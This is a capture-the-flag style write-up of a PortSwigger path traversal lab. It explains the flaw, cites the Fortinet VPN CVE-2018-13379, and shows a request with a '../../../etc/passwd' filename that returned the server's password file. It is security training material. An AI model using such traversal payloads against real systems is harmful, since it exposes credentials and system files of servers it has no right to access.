@@ -1,0 +1,93 @@
+📁 PortSwigger Lab Write-up: File Path Traversal
+🔍 What is Path Traversal?
+
+Path traversal (also known as directory traversal) is a vulnerability that allows an attacker to read arbitrary files on the server that is running an application.
+
+This happens when user input is not properly validated and is used to construct file paths.
+
+⚠️ Impact of Path Traversal
+
+If exploited, an attacker may be able to access:
+
+Application source code and data
+Credentials for backend systems
+Sensitive operating system files
+
+In some cases, attackers may also be able to write to arbitrary files, which can lead to:
+
+Application manipulation
+Data corruption
+Full server compromise
+🌍 Real-World Example: Fortinet SSL VPN (CVE-2018-13379)
+
+CVE-2018-13379 is a critical path traversal vulnerability found in Fortinet’s FortiOS SSL VPN web portal.
+
+The flaw allowed unauthenticated attackers to access sensitive system files by manipulating URL paths.
+
+Because the VPN portal did not properly sanitize user input, attackers could request files outside the intended directory, exposing:
+
+Configuration files
+Session data
+Potential user credentials and authentication information
+
+Although a patch was released in 2019, the vulnerability remained widely exploited due to delayed patching across organizations. Attackers used it to:
+
+Steal VPN credentials
+Gain unauthorized internal network access
+Deploy ransomware in some cases
+
+This became a strong real-world example of how exposed VPN services are high-value targets when patching is neglected.
+
+🧪 Lab: File Path Traversal (PortSwigger)
+🎯 Objective
+
+Retrieve the contents of the /etc/passwd file.
+
+🛠️ Initial Observation
+
+While exploring the application, I discovered the following endpoint:
+
+/image?filename=7.jpg
+
+This endpoint loads images from the server based on a filename parameter.
+
+Example request:
+
+GET /image?filename=7.jpg
+💡 Vulnerability Testing
+
+I intercepted the request using Burp Suite and sent it to Repeater.
+
+I then modified the filename parameter to attempt a path traversal attack:
+
+GET /image?filename=../../../etc/passwd HTTP/2
+💥 Exploitation Result
+
+The server responded with:
+
+HTTP/2 200 OK
+Content-Type: image/jpeg
+Content-Length: 2316
+
+Instead of an image, the response contained the contents of /etc/passwd:
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+carlos:x:12002:12002::/home/carlos:/bin/bash
+user:x:12000:12000::/home/user:/bin/bash
+
+This confirmed that the application was vulnerable to directory traversal, allowing arbitrary file access.
+
+🧠 Key Takeaways
+Path traversal occurs when file paths are built using unsanitized user input
+../ sequences can be used to move up directory levels
+Sensitive files like /etc/passwd can be exposed if no protections are in place
+Similar flaws have heavily impacted real-world systems (like VPN portals)
+Proper input validation and secure file handling are critical defenses
+✅ Lab Status
+
+✔ Successfully exploited path traversal vulnerability
+✔ Retrieved /etc/passwd file
+✔ Lab completed
